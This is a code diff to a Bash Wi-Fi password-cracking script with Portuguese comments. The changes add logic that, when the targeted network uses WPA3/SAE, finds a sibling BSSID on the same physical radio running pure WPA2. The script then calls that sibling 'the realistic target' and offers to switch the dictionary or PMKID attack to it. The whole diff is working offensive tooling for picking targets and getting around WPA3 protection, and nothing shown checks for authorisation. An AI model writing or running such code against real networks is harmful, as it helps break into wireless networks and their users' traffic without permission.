@@ -35,6 +35,12 @@ TARGET_BSSID=""
 TARGET_CH=""
 TARGET_ENC=""
 TARGET_FREQ_LABEL=""
+# BSSID "irmão" em WPA2 puro na mesma rádio física (quando o alvo é WPA3). Redes
+# multi-SSID expõem vários BSSIDs no mesmo rádio que diferem em UM octeto só; se
+# um deles for WPA2 puro, ele é atacável normalmente (o WPA3/SAE não é).
+WPA2_SIBLING_BSSID=""
+WPA2_SIBLING_CH=""
+WPA2_SIBLING_ESSID=""
 SENHA_ENCONTRADA=""
 ROTA_USADA=""
 IP_ROTEADOR=""
@@ -426,7 +432,82 @@ escanear_e_escolher_alvo() {
     fi
 
     log "Alvo escolhido: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
+
+    # Se o alvo é WPA3, procura nas redes já escaneadas um BSSID IRMÃO em WPA2
+    # puro (mesma rádio: difere em 1 octeto). Esse lado WPA2 é atacável de forma
+    # convencional, ao contrário do SAE. Se existir, oferece trocar o alvo.
+    detectar_irmao_wpa2 lista_bssid lista_ch lista_enc lista_essid
+
     avisar_limitacoes_cripto
+}
+
+# Conta em quantos octetos dois BSSIDs diferem (0 a 6). Vale-MAC virtual de
+# multi-SSID normalmente difere em UM octeto (o 1º, com o bit "localmente
+# administrado", ou o último) — por isso "diff == 1" é a assinatura de irmão.
+_bssid_diff_octets() {
+    local a="${1^^}" b="${2^^}"
+    local -a oa ob
+    IFS=':' read -ra oa <<< "$a"
+    IFS=':' read -ra ob <<< "$b"
+    local diff=0 i
+    for i in 0 1 2 3 4 5; do
+        [[ "${oa[$i]:-x}" != "${ob[$i]:-y}" ]] && ((diff++))
+    done
+    echo "$diff"
+}
+
+# Procura, entre os APs escaneados, um BSSID irmão do alvo (difere em 1 octeto)
+# que seja WPA2 PURO (tem WPA2, NÃO tem WPA3/SAE). Recebe os NOMES dos arrays
+# paralelos (passagem por nameref) porque eles são locais ao escaneamento.
+detectar_irmao_wpa2() {
+    local -n _bssid=$1 _ch=$2 _enc=$3 _essid=$4
+    WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""
+
+    # Só faz sentido quando o alvo é WPA3.
+    local alvo_up="${TARGET_ENC^^}"
+    [[ "$alvo_up" == *WPA3* || "$alvo_up" == *SAE* ]] || return 0
+
+    local i enc_up
+    for i in "${!_bssid[@]}"; do
+        [[ "${_bssid[$i]}" == "$TARGET_BSSID" ]] && continue
+        enc_up="${_enc[$i]^^}"
+        # WPA2 puro: tem WPA2 e NÃO tem WPA3 nem SAE.
+        [[ "$enc_up" == *WPA2* && "$enc_up" != *WPA3* && "$enc_up" != *SAE* ]] || continue
+        # Mesmo rádio físico: difere do alvo em exatamente 1 octeto.
+        [[ "$(_bssid_diff_octets "$TARGET_BSSID" "${_bssid[$i]}")" == "1" ]] || continue
+
+        WPA2_SIBLING_BSSID="${_bssid[$i]}"
+        WPA2_SIBLING_CH="${_ch[$i]}"
+        WPA2_SIBLING_ESSID="${_essid[$i]}"
+        log "BSSID irmão em WPA2 puro detectado: ${WPA2_SIBLING_BSSID} (CH ${WPA2_SIBLING_CH}, ESSID ${WPA2_SIBLING_ESSID})."
+        break
+    done
+
+    [[ -z "$WPA2_SIBLING_BSSID" ]] && return 0
+
+    echo
+    echo ">>> DICA: o alvo é WPA3 (não quebra por dicionário), mas há um BSSID na"
+    echo ">>> MESMA rádio física em WPA2 PURO — e esse SIM é atacável do jeito normal:"
+    echo ">>>    WPA2 irmão: ${WPA2_SIBLING_ESSID}  ${WPA2_SIBLING_BSSID}  (canal ${WPA2_SIBLING_CH})"
+    echo
+    local troca=""
+    read -rp "Mirar o BSSID WPA2 irmão em vez do WPA3? [s/N]: " troca
+    if [[ "$troca" =~ ^[Ss]$ ]]; then
+        TARGET_ESSID="$WPA2_SIBLING_ESSID"
+        TARGET_BSSID="$WPA2_SIBLING_BSSID"
+        TARGET_CH="$WPA2_SIBLING_CH"
+        TARGET_ENC="WPA2"
+        if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
+            TARGET_FREQ_LABEL="5 GHz"
+        else
+            TARGET_FREQ_LABEL="2.4 GHz"
+        fi
+        # Já trocou: zera para não re-sugerir o mesmo no aviso seguinte.
+        WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""
+        log "Alvo TROCADO para o irmão WPA2: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
+    else
+        log "Usuário manteve o alvo WPA3 (${TARGET_BSSID}) apesar do irmão WPA2 disponível."
+    fi
 }
 
 # Avisa quando o alvo usa WPA3/SAE. Isso muda o jogo e o script não deve fingir
@@ -446,9 +527,14 @@ avisar_limitacoes_cripto() {
         if [[ "$enc_up" == *WPA2* ]]; then
             echo ">>> Como a rede está em modo transição (WPA3 WPA2), ainda há uma chance"
             echo ">>> SE um cliente conectar pelo lado WPA2 — aí sim o 4-way vira atacável."
+            echo ">>> (clientes que suportam WPA3 preferem SAE, então isso é raro)."
         else
             echo ">>> Esta rede é WPA3 puro: as rotas de dicionário/máscara/PMKID não se"
             echo ">>> aplicam. Siga ciente de que provavelmente não vão encontrar a senha."
+        fi
+        if [[ -n "$WPA2_SIBLING_BSSID" ]]; then
+            echo ">>> Lembrete: há um BSSID WPA2 PURO na mesma rádio (${WPA2_SIBLING_BSSID},"
+            echo ">>> canal ${WPA2_SIBLING_CH}) — esse é o alvo realista, não o WPA3 atual."
         fi
         echo
     fi
